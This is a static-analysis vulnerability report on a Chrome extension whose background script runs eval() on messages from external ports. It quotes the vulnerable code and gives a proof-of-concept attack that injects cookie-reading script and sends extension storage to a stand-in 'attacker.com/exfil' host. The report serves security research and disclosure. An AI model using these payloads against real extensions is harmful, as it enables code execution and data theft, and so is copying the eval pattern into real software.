# CoCo Analysis: lpbcdclphldcjoodmkbkncballmicnlf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_external_port_onMessage → eval_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lpbcdclphldcjoodmkbkncballmicnlf/opgen_generated_files/bg.js
From bg_external_port_onMessage to eval_sink

**Code:**

```javascript
// Background script - bg.js lines 972-1048

// Entry point: External port connection
chrome.runtime.onConnectExternal.addListener(function(connect) {
   var Ext2Web = connect;
   appPorts[++count] = { web: Ext2Web };
   var Ext2Helper = chrome.runtime.connectNative("com.dna.chrome.plugin.helper");
   Ext2Web.onMessage.addListener(onWebMessage(count, Ext2Helper)); // ← attacker-controlled
   Ext2Helper.onMessage.addListener(onNativeMessage(count, Ext2Web));
   Ext2Helper.onDisconnect.addListener(onDisconnected(count, Ext2Web));
});

// Message handler with eval sink
function onWebMessage(id, ext2helper) {
   return function(message) { // ← message from external port
      var obj = eval(message); // ← EVAL SINK: attacker-controlled message
      var cmd = obj.cmd;
      var port = obj.port;
      console.log('ID = ' + id + ' send cmd = ' + cmd + ' to port = ' + port);

      if (cmd === 'e_play') {
         // ... play logic
      }
      else if (cmd === 'e_stop_success') {
         // ... stop logic
      }
      else if (cmd === 'e_multi_inst') {
         // ... multi instance logic
      }
      else{
         try { ext2helper.postMessage({cmd: cmd}); }
         catch (e) { console.log(e); }
      }
   }
}

// Also present in native message handler
function onNativeMessage(id, ext2web) {
   return function(message) {
      var obj = eval(message); // ← Also evaluates messages
      var port = obj.port;
      var brandVersion = obj.brandVersion;
      obj.type = 'message';
      ext2web.postMessage(obj);
   }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onConnectExternal with port messaging

**Attack:**

```javascript
// From a malicious extension or whitelisted website (localhost:* or *.dna.fi:*)
var port = chrome.runtime.connect("lpbcdclphldcjoodmkbkncballmicnlf");

// Send malicious code to be eval'd
port.postMessage("({cmd: 'malicious', exploit: (function(){" +
  "chrome.tabs.executeScript({code: 'alert(document.cookie)'});" +
  "})()})");

// Or simpler arbitrary code execution
port.postMessage("(function(){" +
  "// Arbitrary JavaScript code execution here" +
  "chrome.storage.local.get(null, function(data){" +
  "  fetch('https://attacker.com/exfil', {method: 'POST', body: JSON.stringify(data)});" +
  "});" +
  "return {cmd: 'safe'};" +
  "})()");
```

**Impact:** Arbitrary code execution in the extension's background context. An attacker controlling a whitelisted domain (localhost or *.dna.fi) or creating a malicious extension can execute arbitrary JavaScript code via eval(), allowing them to access all extension privileges including native messaging, accessing extension storage, manipulating tabs, and potentially exfiltrating sensitive data. The eval() directly executes attacker-controlled strings without any sanitization.
